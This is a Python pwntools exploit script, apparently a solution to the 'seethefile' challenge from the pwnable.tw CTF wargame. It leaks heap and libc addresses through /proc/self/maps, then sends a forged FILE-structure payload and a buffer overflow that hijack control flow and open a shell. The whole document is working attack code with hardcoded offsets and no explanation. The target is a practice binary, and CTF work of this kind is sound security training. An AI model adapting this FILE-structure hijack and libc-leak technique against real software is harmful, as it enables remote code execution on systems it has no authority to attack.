from pwn import*
import time

def open_file(file_name):
    s.send("1\n")
    s.recvuntil(":")
    s.send(file_name+"\n")
    s.recvuntil(":")

def read_file():
    s.send("2\n")
    s.recvuntil(":")

def write_file():
    s.send("3\n")
    #print(s.recvuntil("choice :"))
    a=s.recvuntil("choice :")
    #print(hexdump(a))
    heap=int(a[0x120:0x128],16)
    libc=int(a[0x181:0x189],16)


    return (heap,libc)
    #elif option==2:

def close_file():
    s.send("4\n")
    s.recvuntil(":")

def exit_menu(name):

    s.send(name+"\n")
#s=remote("chall.pwnable.tw", 10200)
s=process("./seethefile", env = {'LD_PRELOAD' : './libc_32.so.6'})
s.recvuntil(":")
open_file("/proc/self/maps")
read_file()
(heap,libc)=write_file()
one_gadget=libc+0x3a940#-0xb7e09000+0xb7e43da0#-0x3ada0#+0x3ac5e
one_gadget2=libc-0xb7dc2000+0xb7dfcda0#-0x3ada0#+0x3ac5e
leak1=libc-0xb7e09000+0xb7fbbcc0
heap1=heap-0x0900b000+0x900c178
print(hex(heap1))
print(hex(libc))
print(hex(one_gadget))
print(hex(one_gadget2))
close_file()

open_file("/dev/stdin"+"\n")
s.send("2\n")
print("HELLO")
time.sleep(5)
payload=p32(0)+p32(0x161)+"sh\x00\x00"+p32(0)*12+p32(leak1)+p32(3)+p32(0)*3+p32(heap+0x4a8)+p32(0xffffffff)+p32(0xffffffff)+p32(0)+p32(heap+0x4b4)+p32(0)*14+p32(0x804b190)+p32(0)*10
payload+=p32(one_gadget)*((0x200-len(payload))/4)
s.send(payload+"\n")
pause()
s.send("5"+"k"*200+"\n")
s.recvuntil(":")
s.send("\x41"*32+p32(heap1)+"a"*4+"\n")

#read_file()
#write_file()
#write_file()
#write_file()
#close_file()
#exit_menu("heeyeon")

s.interactive()
s.close()
